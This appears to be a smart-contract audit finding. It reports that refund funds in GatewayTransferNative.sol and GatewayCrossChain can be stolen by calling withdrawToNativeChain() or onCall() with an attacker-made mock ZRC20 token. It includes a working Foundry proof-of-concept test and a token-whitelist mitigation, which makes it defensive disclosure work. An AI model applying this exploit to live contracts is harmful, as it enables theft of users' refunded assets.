# Refund assets can be withdrawn by a malicious user

## Description

The contract `contracts/GatewayTransferNative.sol` collects information about refund funds using a mapping `refundInfos`. The owner of these funds can request these funds by calling `claimRefund()`. But an attacker can get ahead of him and withdraw these funds using the function `withdrawToNativeChain()`.

And the attacker will receive funds, for example, on the Ethereum blockchain.

`GatewayCrossChain` contract has the same vulnerability. An attacker can utilize `onCall()` function for withdrawing.

## Attack scenario

- attacker deploys mock zrc20 token contract
- attacker observes `refundInfos` for new records
- attacker calls `GatewayTransferNative.sol#withdrawToNativeChain()` and receive assets at his address on another chain.



## Proof Of Concept

`test/GatewayTransferNative.t.sol`

```solidity
    function test_stealRefund() public {

        // the contract received refund funds
        uint256 amount = 100 ether;
        token1Z.mint(address(gatewayTransferNative), amount);

        // attacker deploy his own mock ZRC20 contract
        ZRC20Mock mockTocken = new ZRC20Mock("mockToken", "MTkn", 18);
        mockTocken.setGasFee(0);
        mockTocken.setGasZRC20(address(mockTocken));
        mockTocken.mint(user1, 1000 ether);

        uint32 dstChainId = 2;
        address targetZRC20 = address(token1Z);
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);
        bytes memory swapDataZ = "";
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token1B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        bytes memory message = encodeMessage(
            dstChainId,
            targetZRC20,
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(
                fromTokenB,
                toTokenB,
                swapDataB
            ),
            accounts
        );

        vm.startPrank(user1);
        mockTocken.approve(
            address(gatewayTransferNative),
            amount
        );
        gatewayTransferNative.withdrawToNativeChain(
            address(mockTocken),
            amount,
            message
        );
        vm.stopPrank();


        assertEq(mockTocken.balanceOf(address(gatewayTransferNative)), amount);
        assertEq(token1B.balanceOf(user2), 99 ether);

    }
```



## Recommended mitigation

`withdrawToNativeChain()` should accept only whitelisted ZRC20 tokens.
